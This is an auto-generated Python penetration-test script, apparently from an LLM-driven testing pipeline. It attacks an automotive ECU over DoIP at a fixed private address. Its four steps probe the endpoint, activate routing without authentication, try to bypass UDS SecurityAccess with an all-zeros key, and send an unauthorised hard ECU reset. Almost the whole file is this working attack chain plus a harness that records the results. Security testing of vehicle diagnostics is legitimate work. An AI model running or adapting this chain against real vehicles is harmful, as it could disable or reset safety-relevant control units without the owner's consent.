"""
Auto-generated attack test script.

Scenario:  TS_07_DIAGNOSTIC_BYPASS_AND_ECU_RESET
Path:      P_TS_07_DOIP_BYPASS_RESET — Probe DoIP endpoint -> unauthenticated routing -> SecurityAccess bypass -> ECU reset
Steps:     T1, T2, T3, T4
Generated: 2026-04-26T12:52:19Z

Produced by step5_assemble_v3. Do NOT edit manually.
Run:       python TS_07_DIAGNOSTIC_BYPASS_AND_ECU_RESET__P_TS_07_DOIP_BYPASS_RESET.py
"""
from __future__ import annotations

import json
import sys
import threading
import traceback

# Force UTF-8 stdout so unicode in observations/notes and non-ASCII
# characters in harness messages do not crash on cp949 / cp1252 consoles.
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except (AttributeError, OSError):
    pass


# ----------------------------------------------------------------------
# T1
# ----------------------------------------------------------------------
def _step_T1(context: dict, artifacts: dict) -> dict:
    import time

    observations = []

    endpoint = {
        "host": "172.23.96.1",
        "port": 8445,
        "target_host": "172.23.96.1",
        "target_port": 8445,
        "protocol": "doip_tcp",
        "doip_version": "0x02",
        "doip_entity_address": "0x00E0",
        "client_logical_address_default": "0x0E00",
        "default_routing_activation_type": "0x00",
    }

    target_ref = {
        "doip_version": "0x02",
        "doip_entity_address": "0x00E0",
        "client_logical_address": "0x0E00",
        "probe_intent": "vehicle_identification_request",
    }

    host = endpoint["target_host"]
    port = endpoint["target_port"]
    protocol = endpoint["protocol"]
    doip_version = int(endpoint["doip_version"], 16)
    doip_entity_address = int(endpoint["doip_entity_address"], 16)
    client_logical_address = int(endpoint["client_logical_address_default"], 16)
    default_routing_activation_type = int(endpoint["default_routing_activation_type"], 16)
    probe_intent = target_ref["probe_intent"]

    try:
        from doipclient import DoIPClient

        t0 = time.time()
        try:
            client = DoIPClient(
                host,
                doip_entity_address,
                client_logical_address=client_logical_address,
                tcp_port=port,
                protocol_version=doip_version,
                activation_type=default_routing_activation_type,
            )
            elapsed_connect = int((time.time() - t0) * 1000)

            observations.append({
                "name": "doip_tcp_connect",
                "value": {
                    "connected": True,
                    "elapsed_ms": elapsed_connect,
                    "error_str": "",
                    "host": host,
                    "port": port,
                    "protocol": protocol,
                    "doip_version": endpoint["doip_version"],
                    "doip_entity_address": endpoint["doip_entity_address"],
                    "client_logical_address": endpoint["client_logical_address_default"],
                    "default_routing_activation_type": endpoint["default_routing_activation_type"],
                }
            })

            # The DoIPClient constructor automatically sends a routing activation request.
            # That response is handled internally. We now send a vehicle identification
            # request as the probe_intent indicates.
            # DoIP Vehicle Identification Request payload type = 0x0001, no payload body.
            # We use the library's request_vehicle_identification method if available,
            # otherwise construct manually via the library's lower-level surface.

            t1 = time.time()
            try:
                vid_response = client.request_vehicle_identification()
                elapsed_vid = int((time.time() - t1) * 1000)

                resp_hex = ""
                if vid_response is not None:
                    try:
                        resp_hex = bytes(vid_response).hex()
                    except Exception:
                        resp_hex = repr(vid_response)

                observations.append({
                    "name": "send_vehicle_identification_request",
                    "value": {
                        "request_hex": "02fd000100000000",
                        "response_hex": resp_hex,
                        "bytes_sent": 8,
                        "bytes_received": len(resp_hex) // 2 if resp_hex else 0,
                        "elapsed_ms": elapsed_vid,
                        "response_received": vid_response is not None,
                        "error_str": "",
                        "probe_intent": probe_intent,
                    }
                })
            except Exception as e_vid:
                elapsed_vid = int((time.time() - t1) * 1000)
                observations.append({
                    "name": "send_vehicle_identification_request",
                    "value": {
                        "request_hex": "02fd000100000000",
                        "response_hex": "",
                        "bytes_sent": 8,
                        "bytes_received": 0,
                        "elapsed_ms": elapsed_vid,
                        "response_received": False,
                        "error_str": repr(e_vid),
                        "probe_intent": probe_intent,
                    }
                })

            try:
                client.close()
            except Exception:
                pass

        except Exception as e_conn:
            elapsed_connect = int((time.time() - t0) * 1000)
            observations.append({
                "name": "doip_tcp_connect",
                "value": {
                    "connected": False,
                    "elapsed_ms": elapsed_connect,
                    "error_str": repr(e_conn),
                    "host": host,
                    "port": port,
                    "protocol": protocol,
                }
            })

    except ImportError as e_imp:
        observations.append({
            "name": "exception",
            "value": {
                "type": "ImportError",
                "message": str(e_imp),
                "request_hex": "",
            }
        })

    return {
        "observations": observations,
        "artifacts": {},
        "notes": "T1: DoIP probe via doipclient library to target {}:{} using protocol {}".format(host, port, protocol),
    }

# ----------------------------------------------------------------------
# T2
# ----------------------------------------------------------------------
def _step_T2(context: dict, artifacts: dict) -> dict:
    import time

    observations = []

    host = "172.23.96.1"
    port = 8445
    doip_version = 0x02
    doip_entity_address = 0x00E0
    client_logical_address = 0x0E00
    routing_activation_type = 0x00
    timeout_sec = 5

    try:
        from doipclient import DoIPClient

        t0 = time.time()
        try:
            client = DoIPClient(
                host,
                doip_entity_address,
                client_logical_address=client_logical_address,
                tcp_port=port,
                protocol_version=doip_version,
                activation_type=routing_activation_type,
                connect_timeout=timeout_sec,
            )
            elapsed_connect = int((time.time() - t0) * 1000)

            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": True,
                    "elapsed_ms": elapsed_connect,
                    "error_str": "",
                    "host": host,
                    "port": port,
                    "doip_version": "0x02",
                    "doip_entity_address": "0x00E0",
                    "client_logical_address": "0x0E00",
                    "routing_activation_type": "0x00",
                    "routing_activation_type_label": "default (unauthenticated)",
                }
            })

            ra_req_payload_type = 0x0005
            sa_bytes = client_logical_address.to_bytes(2, 'big')
            act_type_byte = routing_activation_type.to_bytes(1, 'big')
            reserved = b'\x00\x00\x00\x00'
            ra_payload = sa_bytes + act_type_byte + reserved
            ver_byte = doip_version.to_bytes(1, 'big')
            inv_ver_byte = (0xFF ^ doip_version).to_bytes(1, 'big')
            pt_bytes = ra_req_payload_type.to_bytes(2, 'big')
            pl_bytes = len(ra_payload).to_bytes(4, 'big')
            ra_request_bytes = ver_byte + inv_ver_byte + pt_bytes + pl_bytes + ra_payload
            ra_request_hex = ra_request_bytes.hex()

            ra_response_hex = ""
            ra_response_received = False
            ra_bytes_received = 0

            try:
                t1 = time.time()
                ra_result = client.request_activation(
                    routing_activation_type
                )
                elapsed_ra = int((time.time() - t1) * 1000)

                if ra_result is not None:
                    ra_response_received = True
                    try:
                        ra_resp_bytes = bytes(ra_result)
                        ra_response_hex = ra_resp_bytes.hex()
                        ra_bytes_received = len(ra_resp_bytes)
                    except Exception:
                        ra_response_hex = repr(ra_result)
                        ra_bytes_received = len(ra_response_hex)

                observations.append({
                    "name": "send_routing_activation_request",
                    "value": {
                        "request_hex": ra_request_hex,
                        "response_hex": ra_response_hex,
                        "bytes_sent": len(ra_request_bytes),
                        "bytes_received": ra_bytes_received,
                        "elapsed_ms": elapsed_ra,
                        "response_received": ra_response_received,
                        "error_str": "",
                    }
                })

            except Exception as e_ra:
                elapsed_ra = int((time.time() - t1) * 1000)
                observations.append({
                    "name": "send_routing_activation_request",
                    "value": {
                        "request_hex": ra_request_hex,
                        "response_hex": "",
                        "bytes_sent": len(ra_request_bytes),
                        "bytes_received": 0,
                        "elapsed_ms": elapsed_ra,
                        "response_received": False,
                        "error_str": repr(e_ra),
                    }
                })

            try:
                client.close()
            except Exception:
                pass

        except Exception as e_conn:
            elapsed_connect = int((time.time() - t0) * 1000)
            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": False,
                    "elapsed_ms": elapsed_connect,
                    "error_str": repr(e_conn),
                    "host": host,
                    "port": port,
                }
            })

    except ImportError as e_imp:
        observations.append({
            "name": "exception",
            "value": {
                "type": "ImportError",
                "message": str(e_imp),
                "request_hex": "",
            }
        })

    return {
        "observations": observations,
        "artifacts": {},
        "notes": "T2: Unauthenticated routing activation request via doipclient to {}:{} with activation_type=0x00".format(host, port),
    }

# ----------------------------------------------------------------------
# T3
# ----------------------------------------------------------------------
def _step_T3(context: dict, artifacts: dict) -> dict:
    import time

    observations = []

    # Tier 1 — endpoint values
    host = "172.23.96.1"
    port = 8445
    doip_version = 0x02
    doip_entity_address = 0x00E0
    client_logical_address = 0x0E00
    routing_activation_type = 0x00
    timeout_sec = 5

    # Tier 2 — target_ref values
    uds_service_security_access = 0x27

    # SecurityAccess sub-functions
    SA_REQUEST_SEED = 0x01  # requestSeed for securityAccessType 1
    SA_SEND_KEY = 0x02      # sendKey for securityAccessType 1

    try:
        from doipclient import DoIPClient

        # ── Connect and activate routing (prerequisite state) ──
        t0 = time.time()
        try:
            client = DoIPClient(
                host,
                doip_entity_address,
                client_logical_address=client_logical_address,
                tcp_port=port,
                protocol_version=doip_version,
                activation_type=routing_activation_type,
                connect_timeout=timeout_sec,
            )
            elapsed_connect = int((time.time() - t0) * 1000)

            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": True,
                    "elapsed_ms": elapsed_connect,
                    "error_str": "",
                }
            })
        except Exception as e_conn:
            elapsed_connect = int((time.time() - t0) * 1000)
            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": False,
                    "elapsed_ms": elapsed_connect,
                    "error_str": repr(e_conn),
                }
            })
            return {
                "observations": observations,
                "artifacts": {},
                "notes": "T3: Connection failed; cannot proceed with SecurityAccess.",
            }

        # ── Step 1: Request seed (SecurityAccess 0x27 sub=0x01) ──
        sa_seed_request = bytes([uds_service_security_access, SA_REQUEST_SEED])
        sa_seed_request_hex = sa_seed_request.hex()
        seed_hex = ""
        seed_bytes_received = 0
        seed_response_received = False
        seed_error = ""
        seed_raw = None

        t1 = time.time()
        try:
            seed_response = client.send_diagnostic(sa_seed_request, timeout=timeout_sec)
            elapsed_seed = int((time.time() - t1) * 1000)

            if seed_response is not None:
                seed_response_received = True
                try:
                    seed_raw = bytes(seed_response)
                    seed_hex = seed_raw.hex()
                    seed_bytes_received = len(seed_raw)
                except Exception:
                    seed_hex = repr(seed_response)
                    seed_bytes_received = len(seed_hex)
            else:
                elapsed_seed = int((time.time() - t1) * 1000)

        except Exception as e_seed:
            elapsed_seed = int((time.time() - t1) * 1000)
            seed_error = repr(e_seed)

        observations.append({
            "name": "send_security_access_request_seed",
            "value": {
                "request_hex": sa_seed_request_hex,
                "response_hex": seed_hex,
                "bytes_sent": len(sa_seed_request),
                "bytes_received": seed_bytes_received,
                "elapsed_ms": elapsed_seed,
                "response_received": seed_response_received,
                "error_str": seed_error,
            }
        })

        # ── Step 2: Send key (SecurityAccess 0x27 sub=0x02) ──
        # Attempt bypass with an all-zeros key matching the seed length.
        # The seed is in the positive response after the SID+subfunction echo bytes (0x67, 0x01).
        # If we got a positive response (first byte == 0x67), extract the seed.
        extracted_seed = b""
        if seed_raw and len(seed_raw) >= 2 and seed_raw[0] == 0x67:
            extracted_seed = seed_raw[2:]  # bytes after 0x67 0x01

        # Construct a trivial key: all zeros, same length as seed (bypass attempt)
        if len(extracted_seed) > 0:
            trivial_key = b"\x00" * len(extracted_seed)
        else:
            # If no seed extracted (negative response or empty), still attempt with a minimal key
            trivial_key = b"\x00\x00\x00\x00"

        sa_key_request = bytes([uds_service_security_access, SA_SEND_KEY]) + trivial_key
        sa_key_request_hex = sa_key_request.hex()
        key_hex = ""
        key_bytes_received = 0
        key_response_received = False
        key_error = ""

        t2 = time.time()
        try:
            key_response = client.send_diagnostic(sa_key_request, timeout=timeout_sec)
            elapsed_key = int((time.time() - t2) * 1000)

            if key_response is not None:
                key_response_received = True
                try:
                    key_raw = bytes(key_response)
                    key_hex = key_raw.hex()
                    key_bytes_received = len(key_raw)
                except Exception:
                    key_hex = repr(key_response)
                    key_bytes_received = len(key_hex)
            else:
                elapsed_key = int((time.time() - t2) * 1000)

        except Exception as e_key:
            elapsed_key = int((time.time() - t2) * 1000)
            key_error = repr(e_key)

        observations.append({
            "name": "send_security_access_send_key",
            "value": {
                "request_hex": sa_key_request_hex,
                "response_hex": key_hex,
                "bytes_sent": len(sa_key_request),
                "bytes_received": key_bytes_received,
                "elapsed_ms": elapsed_key,
                "response_received": key_response_received,
                "error_str": key_error,
                "key_strategy": "all_zeros_bypass",
                "seed_hex": extracted_seed.hex() if extracted_seed else "",
            }
        })

        # ── Cleanup ──
        try:
            client.close()
        except Exception:
            pass

    except ImportError as e_imp:
        observations.append({
            "name": "exception",
            "value": {
                "type": "ImportError",
                "message": str(e_imp),
                "request_hex": "",
            }
        })

    return {
        "observations": observations,
        "artifacts": {},
        "notes": "T3: SecurityAccess seed-key bypass attempt (all-zeros key) via doipclient to {}:{}".format(host, port),
    }

# ----------------------------------------------------------------------
# T4
# ----------------------------------------------------------------------
def _step_T4(context: dict, artifacts: dict) -> dict:
    import time

    observations = []

    # Tier 1 — endpoint values
    host = "172.23.96.1"
    port = 8445
    doip_version = 0x02
    doip_entity_address = 0x00E0
    client_logical_address = 0x0E00
    routing_activation_type = 0x00
    timeout_sec = 5

    # Tier 2 — target_ref values
    uds_service_ecu_reset = 0x11

    # ECUReset sub-function: hardReset = 0x01 (ISO 14229-1)
    ECU_RESET_HARD = 0x01

    try:
        from doipclient import DoIPClient

        # ── Connect and activate routing (re-establish session state) ──
        t0 = time.time()
        try:
            client = DoIPClient(
                host,
                doip_entity_address,
                client_logical_address=client_logical_address,
                tcp_port=port,
                protocol_version=doip_version,
                activation_type=routing_activation_type,
                connect_timeout=timeout_sec,
            )
            elapsed_connect = int((time.time() - t0) * 1000)

            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": True,
                    "elapsed_ms": elapsed_connect,
                    "error_str": "",
                }
            })
        except Exception as e_conn:
            elapsed_connect = int((time.time() - t0) * 1000)
            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": False,
                    "elapsed_ms": elapsed_connect,
                    "error_str": repr(e_conn),
                }
            })
            return {
                "observations": observations,
                "artifacts": {},
                "notes": "T4: Connection failed; cannot proceed with ECUReset.",
            }

        # ── Send UDS ECUReset (0x11 0x01 = hardReset) ──
        ecu_reset_request = bytes([uds_service_ecu_reset, ECU_RESET_HARD])
        ecu_reset_request_hex = ecu_reset_request.hex()
        reset_response_hex = ""
        reset_bytes_received = 0
        reset_response_received = False
        reset_error = ""

        t1 = time.time()
        try:
            reset_response = client.send_diagnostic(ecu_reset_request, timeout=timeout_sec)
            elapsed_reset = int((time.time() - t1) * 1000)

            if reset_response is not None:
                reset_response_received = True
                try:
                    reset_raw = bytes(reset_response)
                    reset_response_hex = reset_raw.hex()
                    reset_bytes_received = len(reset_raw)
                except Exception:
                    reset_response_hex = repr(reset_response)
                    reset_bytes_received = len(reset_response_hex)
        except Exception as e_reset:
            elapsed_reset = int((time.time() - t1) * 1000)
            reset_error = repr(e_reset)

        observations.append({
            "name": "send_ecu_reset_hard_request",
            "value": {
                "request_hex": ecu_reset_request_hex,
                "response_hex": reset_response_hex,
                "bytes_sent": len(ecu_reset_request),
                "bytes_received": reset_bytes_received,
                "elapsed_ms": elapsed_reset,
                "response_received": reset_response_received,
                "error_str": reset_error,
            }
        })

        # ── Cleanup ──
        try:
            client.close()
        except Exception:
            pass

    except ImportError as e_imp:
        observations.append({
            "name": "exception",
            "value": {
                "type": "ImportError",
                "message": str(e_imp),
                "request_hex": "",
            }
        })

    return {
        "observations": observations,
        "artifacts": {},
        "notes": "T4: Unauthorised UDS ECUReset (hardReset 0x11 0x01) via doipclient to {}:{}".format(host, port),
    }

# ---------------------------------------------------------------------------
# Runtime harness — OBSERVATIONS ONLY (no verdict computed here).
#
# Contract (v4a):
#   run_step returns {observations: [...], artifacts: {...}, notes: <str|null>}.
#   The harness injects step_id / status / error and applies a compat shim
#   (assertion_results=[], evidence=[], _script_contract="v4a") so that
#   downstream evaluators that still read the old keys do not KeyError.
#
#   A 15-second wall-clock timeout protects against infinite loops in
#   LLM-generated code. On timeout, status="timeout" and _timeout=True
#   disambiguate from a plain exception.
#
# Verdict classification (PASS/FAIL/INCONCLUSIVE) is the job of a
# downstream evaluator (Step 4B). The harness here records only what
# happened at runtime.
# ---------------------------------------------------------------------------

_STEP_TIMEOUT_SECONDS = 15.0


def _run_with_timeout(fn, context, artifacts):
    """Run fn(context, artifacts) on a daemon thread; enforce wall-clock
    timeout via join. Returns (value, error_exc, timed_out).

    Note: if the step times out, the thread keeps running in the
    background (Python has no safe thread-kill). daemon=True ensures the
    interpreter exits cleanly on main() return. For the MVP this is
    acceptable — operator wraps the whole run in its own outer timeout.
    """
    box = {"value": None, "error": None}
    def _target():
        try:
            box["value"] = fn(dict(context), dict(artifacts))
        except BaseException as e:  # noqa: BLE001
            box["error"] = e
    t = threading.Thread(target=_target, daemon=True)
    t.start()
    t.join(_STEP_TIMEOUT_SECONDS)
    return box["value"], box["error"], t.is_alive()


def _compat_shim(entry):
    """Inject the backcompat keys Step4 may still read. Call once per
    entry AFTER status/error/observations/artifacts/notes are set."""
    entry.setdefault("observations", [])
    entry.setdefault("artifacts", {})
    entry.setdefault("notes", None)
    entry["assertion_results"] = []
    entry["evidence"] = []
    entry["_script_contract"] = "v4a"


def main():
    context = {'connection_id': 'CONN_11', 'protocol': 'DoIP / ISO 13400-2 over TCP', 'host': None, 'port': None, 'connection_properties': {'capability_tags': ['doip_routing_activation', 'uds_session_control', 'uds_security_access', 'uds_ecu_reset', 'uds_read_did']}}
    artifacts = {}
    record = {
        "scenario_id": 'TS_07_DIAGNOSTIC_BYPASS_AND_ECU_RESET',
        "path_id": 'P_TS_07_DOIP_BYPASS_RESET',
        "steps": [],
    }

    steps = [
        ("T1", _step_T1),
        ("T2", _step_T2),
        ("T3", _step_T3),
        ("T4", _step_T4),
    ]

    for step_id, fn in steps:
        print(f"=== {step_id} ===")
        entry = {"step_id": step_id}

        value, err, timed_out = _run_with_timeout(fn, context, artifacts)

        if timed_out:
            print(f"  [TIMEOUT] exceeded {_STEP_TIMEOUT_SECONDS}s")
            entry["status"] = "timeout"
            entry["error"] = {"type": "Timeout",
                              "message": f"exceeded {_STEP_TIMEOUT_SECONDS}s wall-clock"}
            entry["_timeout"] = True
            _compat_shim(entry)
            record["steps"].append(entry)
            continue

        if err is not None:
            print(f"  [EXCEPTION] {type(err).__name__}: {err}")
            traceback.print_exception(type(err), err, err.__traceback__)
            entry["status"] = "exception"
            entry["error"] = {"type": type(err).__name__, "message": str(err)}
            _compat_shim(entry)
            record["steps"].append(entry)
            continue

        if not isinstance(value, dict):
            print(f"  [BAD RETURN] run_step returned {type(value).__name__}")
            entry["status"] = "bad_return_type"
            entry["error"] = {"type": "BadReturnType",
                              "message": f"expected dict, got {type(value).__name__}"}
            _compat_shim(entry)
            record["steps"].append(entry)
            continue

        observations = value.get("observations") or []
        step_artifacts = value.get("artifacts") or {}
        notes = value.get("notes")

        artifacts.update(step_artifacts)

        entry["status"] = "ok"
        entry["error"] = None
        entry["observations"] = observations
        entry["artifacts"] = step_artifacts
        entry["notes"] = notes
        _compat_shim(entry)
        record["steps"].append(entry)

        print(f"  observations: {len(observations)}; "
              f"artifacts: {list(step_artifacts.keys())}")

    print()
    print("=== observations recorded (no verdict — use downstream evaluator) ===")
    print(json.dumps(record, ensure_ascii=False, indent=2, default=str))
    return 0


if __name__ == "__main__":
    sys.exit(main())
